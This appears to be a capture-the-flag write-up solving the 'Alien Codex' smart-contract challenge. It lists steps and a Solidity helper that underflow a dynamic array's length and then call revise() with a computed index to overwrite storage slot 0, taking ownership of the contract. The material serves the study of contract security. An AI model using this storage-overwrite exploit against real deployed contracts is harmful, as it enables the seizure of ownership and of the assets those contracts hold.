# Alien Codex - Hack

1. Check the owner
2. Call `makeContract()`
3. Call `retract()`
4. Call `revise(35707666377435648211887908874984608119992236509074197713628505308453184860938,0x0000000000000000000000015B38Da6a701c568545dCfcB03FcB875f56beddC4)` where the first argument
   is calculated through `arrLocDiff(1)`:

```solidity
function arrLocDiff(uint256 slot) public pure returns (uint256) {
  return uint256(-1) - uint256(keccak256(abi.encodePacked(slot)));
}
```

and the second arument is the contract bool(1) and the new owner(5B38Da6a701c568545dCfcB03FcB875f56beddC4)

5. check the owner again, the new owner is `5B38Da6a701c568545dCfcB03FcB875f56beddC4`

We did it by overriding the memory at zero slot which is the location of the owner variable.
